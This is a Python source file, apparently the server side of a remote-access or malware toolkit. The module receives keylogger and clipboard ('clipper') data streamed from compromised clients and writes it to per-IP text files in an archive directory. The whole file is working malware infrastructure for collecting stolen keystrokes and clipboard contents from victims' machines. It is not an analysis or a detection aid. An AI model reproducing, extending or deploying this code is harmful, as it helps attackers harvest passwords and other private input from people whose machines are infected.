'''
    Handles the keylogger & clipper stream module
    connections. Simply writes to files logging
    the data sent from the client in intervals.

    Verified: 2021 February 7
    * Follows PEP8
    * Tested Platforms
        * Windows 10
'''

from server.state import ServerStatic, Dynamic
from server.modules.module import Module
from server.helper import ServerHelper
from shared.helper import Helper
from shared.error import Error
from shared.data import Data

import os


class Logger(Module):

    def __init__(self, logger_type, conn, token, connect_ip):
        super().__init__(conn, token, connect_ip)
        self.__module = logger_type.capitalize()
        self.__logger_type = logger_type

    def __str__(self):
        return self.__module

    @Error.quiet_thread
    def __recv(self):
        try:
            with self.conn as sock:
                dirpath = os.path.join(ServerStatic.ARCHIVE_DIR,
                                       self.safe_connect_ip,
                                       self.__logger_type)
                filepath = os.path.join(
                    dirpath, ServerHelper.filename('txt'))

                while True:
                    data = Data.recv(sock, True)

                    if data:
                        if not os.path.isdir(dirpath):
                            os.makedirs(dirpath, exist_ok=True)

                        Helper.write_file(filepath, data)

                    Data.send(sock)
        finally:
            del Dynamic.MODULES[self.token]

    def live(self, *args):
        Helper.thread(self.__recv, *args)
